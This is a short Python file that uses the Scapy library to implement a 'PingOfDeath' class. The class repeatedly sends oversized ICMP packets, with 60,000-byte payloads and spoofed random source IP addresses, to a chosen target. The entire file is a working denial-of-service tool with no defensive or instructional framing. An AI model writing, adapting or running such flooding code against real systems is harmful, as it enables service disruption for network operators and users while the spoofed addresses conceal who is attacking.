from scapy.layers.inet import *
from scapy.all import *
import initialize as random_ip

host_name = socket.gethostname()
host_ip = socket.gethostbyname(host_name)


class PingOfDeath:
    def __init__(self, dst_ip):
        self.dst_ip = dst_ip
        self.sending = True                          # current process
        self.sending_count = 0                       # syn count
        self.data = "x" * 60000           # data

    def ping_of_death(self, count):
        while self.sending:
            L3 = IP(src=random_ip.random_ip(), dst=self.dst_ip)
            L4 = ICMP()
            L5 = Raw(load=self.data)
            pkt = L3 / L4 / L5
            send(pkt)
            self.sending_count += 1
            print("Sent packet count: " + str(self.sending_count))
            if self.sending_count == count:
                break

